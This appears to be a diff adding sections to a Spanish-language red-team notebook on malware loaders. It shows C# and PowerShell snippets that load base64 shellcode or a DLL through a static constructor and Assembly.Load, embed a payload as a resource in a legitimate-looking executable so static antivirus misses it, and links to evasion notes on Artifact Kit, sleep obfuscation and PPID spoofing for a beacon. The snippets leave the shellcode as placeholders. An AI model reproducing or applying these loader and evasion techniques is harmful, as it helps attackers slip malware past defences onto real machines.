@@ -89,3 +89,46 @@ Resultado: `dropper.js` que deserializa el assembly y ejecuta el constructor de 
 - El dropper escribe en disco — AV puede escanear el archivo al crearse.
 - Combinar con técnicas de evasión de Artifact Kit para el payload embebido.
 - Considerar usar rutas y nombres de archivo que imiten aplicaciones legítimas.
+
+---
+
+## .NET Class Library + Runner (variante simple)
+
+Para cargas más simples, sin pasar por GadgetToJScript, basta un constructor estático que ejecute el shellcode al cargar el tipo:
+
+```csharp
+public class Loader {
+    static Loader() {
+        byte[] shellcode = Convert.FromBase64String("...");
+        // Inject shellcode aquí
+    }
+}
+```
+
+```powershell
+# Cargar y ejecutar desde PowerShell
+[System.Reflection.Assembly]::Load([Convert]::FromBase64String("BASE64_DLL"))
+[Loader]::new()
+```
+
+## Embedded Resources (variante C# nativa)
+
+Embeber el payload como recurso de un ejecutable legítimo:
+
+```csharp
+var assembly = Assembly.GetExecutingAssembly();
+using (Stream s = assembly.GetManifestResourceStream("App.payload.bin"))
+{
+    byte[] buf = new byte[s.Length];
+    s.Read(buf, 0, buf.Length);
+    // Ejecutar buf como shellcode
+}
+```
+
+**Ventaja:** AV estático solo ve el ejecutable wrapper, no el payload raw.
+
+## Evasión asociada
+
+- [[06 EVASION & OPSEC/Artifact Evasion/Artifact Kit]] para el shellcode
+- [[06 EVASION & OPSEC/Memory Evasion/Sleep Obfuscation]] para el beacon
+- [[06 EVASION & OPSEC/Process Injection/PPID Spoofing]] para el proceso padre
